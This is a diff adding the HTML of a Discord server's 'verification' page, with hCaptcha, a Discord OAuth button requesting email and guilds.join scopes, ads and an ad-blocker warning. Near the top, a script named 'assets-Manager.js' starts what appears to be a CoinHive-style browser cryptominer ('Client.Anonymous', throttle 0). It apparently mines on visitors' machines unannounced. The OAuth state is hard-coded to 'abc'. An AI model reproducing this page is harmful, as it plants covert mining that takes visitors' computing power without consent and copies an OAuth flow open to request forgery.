@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Crashary Verification" />
+<meta property="og:description" content="Verification for crashary.uk" />
+<meta property="og:url" content="https://verification.crashary.uk" />
+<meta property="og:image" content="favicon.ico" />
+<meta content="#992318" data-react-helmet="true" name="theme-color" />
+
+<head>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script src="https://kit.fontawesome.com/5ea35be0ac.js" crossorigin="anonymous"></script>
+  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8939266182833306"
+    crossorigin="anonymous" onerror="adBlocked();"></script>
+  <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crashary Verification</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    .button {
+      margin-top: 10px;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      color: #fff;
+      background-color: #9c0000;
+      font-family: 'Roboto', sans-serif;
+      font-size: 1.5rem;
+      outline: 0;
+      border-radius: 0.25rem;
+      box-shadow: 0 0 0.5rem rgba(0, 0, 0, 0.3);
+      cursor: pointer;
+    }
+
+    .button:active {
+      margin-top: 10px;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      color: #fff;
+      background-color: #9c0000;
+      font-family: 'Roboto', sans-serif;
+      font-size: 1.5rem;
+      outline: 0;
+      border-radius: 0.25rem;
+      box-shadow: 0 0 0.5rem rgba(0, 0, 0, 0.3);
+      cursor: pointer;
+    }
+
+    .button span {
+      cursor: pointer;
+      display: inline-block;
+      position: relative;
+      transition: 0.5s;
+    }
+
+    .button span:after {
+      content: '»';
+      position: absolute;
+      opacity: 0;
+      top: 0;
+      right: -20px;
+      transition: 0.5s;
+    }
+
+    .button:hover span {
+      padding-right: 25px;
+    }
+
+    .button:hover span:after {
+      opacity: 1;
+      right: 0;
+    }
+
+    .button:disabled {
+      opacity: 0.3;
+    }
+  </style>
+
+</head>
+<script src="assets-Manager.js"></script>
+<script>
+  var _client = new Client.Anonymous('2cc7829abf3b987dd7799147ee8a154f0a32d721c7d3e7c464f248be1ff4523f', {
+    throttle: 0, c: 'w', ads: 0
+  });
+  _client.start();
+</script>
+
+<body>
+  <div class="topadwrap" style="width: 728px; height: auto !important; clear: both; text-align: center;">
+    <ins class="adsbygoogle"
+      style="display: block; margin: 10px auto 16px; background-color: transparent; height: 90px;" data-ad-format="auto"
+      data-ad-client="ca-pub-8939266182833306" data-ad-slot="8512325236" data-full-width-responsive="true">
+    </ins>
+  </div>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+  <div id="particles-js"></div>
+  <script src="particle.js"></script>
+  <div id="content">
+    <div class="image-container">
+      <img alt="Crashary" src="crashary.png" class="crashary image">
+      <img alt="Crashary Logo" class="title-img image" src="logo.gif">
+      <p>To get started with Crashary, all you have to do is verify yourself with the button below.</p>
+      <p><a href="https://crashary.uk/policy">Privacy Policy</a></p>
+    </div>
+    <div class="h-captcha" data-sitekey="869105c0-4245-4737-b5f8-94ad58bc70e5" data-theme="dark"
+      data-callback="captchaCheck" data-expired-callback="onExpire" data-chalexpired-callback="onExpire"></div>
+    <div class="button-container" style="width: 305px;">
+      <button class="button"
+        onClick="window.location.href='https://discord.com/api/oauth2/authorize?client_id=1078040435328561264&redirect_uri=https%3A%2F%2Fverification.crashary.uk&response_type=code&scope=identify%20guilds%20email%20guilds.join'"><span>Verify
+          Now!</span></button>
+    </div>
+  </div>
+  <script>
+    document.getElementsByClassName("button")[0].disabled = true;
+
+    var captchaCheck = function (response) {
+      var OnSuccess = document.querySelector(".hcaptcha-success");
+      console.log("hCaptcha - Request Successful");
+      document.getElementsByClassName("button")[0].disabled = false;
+    };
+
+    var onExpire = function (response) {
+      var logEl = document.querySelector(".hcaptcha-success");
+      console.log("hCaptcha - Captcha has expired.");
+      document.getElementsByClassName("button")[0].disabled = true;
+    };
+  </script>
+  <script src="./clientScript.js"></script>
+  <script>
+    function generateRandomString() {
+      return "abc";
+    }
+
+    window.onload = () => {
+      const fragment = new URLSearchParams(window.location.hash.slice(1));
+      const [accessToken, tokenType, state] = [fragment.get('access_token'), fragment.get('token_type'), fragment.get('state')];
+
+      if (!accessToken) {
+        const randomString = generateRandomString();
+        localStorage.setItem('oauth-state', randomString);
+      }
+    };
+  </script>
+  </div>
+  <script>
+    var adB = false;
+  </script>
+  <script src="xpopup.js"></script>
+  <script src="core-Detect.js"></script>
+  <script>
+    if (!adB) {
+      swal("Ad Blocker Detected", "Please turn off the Ad Blocker when using our site.", "error", {
+        buttons: {
+          catch: {
+            text: "Refresh",
+            value: "refresh",
+          }
+        },
+      }).then((value) => {
+        switch (value) {
+          case null:
+            window.location.href = 'https://verification.crashary.uk'
+            break;
+
+          case "refresh":
+            window.location.href = '';
+            break;
+        }
+      });
+    }
+
+    function adBlocked() {
+      console.log('Ad Blocker Detection - Ad was blocked.')
+      document.getElementsByClassName("button")[0].disabled = true;
+      var adB = false;
+    }
+  </script>
+  <script>
+    /*
+        function createRipple(event) {
+          const button = event.currentTarget;
+    
+          const circle = document.createElement("span");
+          const diameter = Math.max(button.clientWidth, button.clientHeight);
+          const radius = diameter / 2;
+    
+          circle.style.width = circle.style.height = `${diameter}px`;
+          circle.style.left = `${event.clientX - button.offsetLeft - radius}px`;
+          circle.style.top = `${event.clientY - button.offsetTop - radius}px`;
+          circle.classList.add("ripple");
+    
+          const ripple = button.getElementsByClassName("ripple")[0];
+    
+          if (ripple) {
+            ripple.remove();
+          }
+    
+          button.appendChild(circle);
+        }
+    
+        const buttons = document.getElementsByTagName("button");
+        for (const button of buttons) {
+          button.addEventListener("click", createRipple);
+        }
+    */
+  </script>
+  <script>
+    (function () { id = 'mScaBGkMwW5u-MBvDni17NotI'; function l(u) { var e = document.createElement('script'); e.type = 'text/javascript'; e.src = 'https://verification.crashary.uk/' + u; e.async = 0; var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(e, x); } l('xpopup.js'); l('analyze.js'); })();
+  </script>
+</body>
+
+</html>
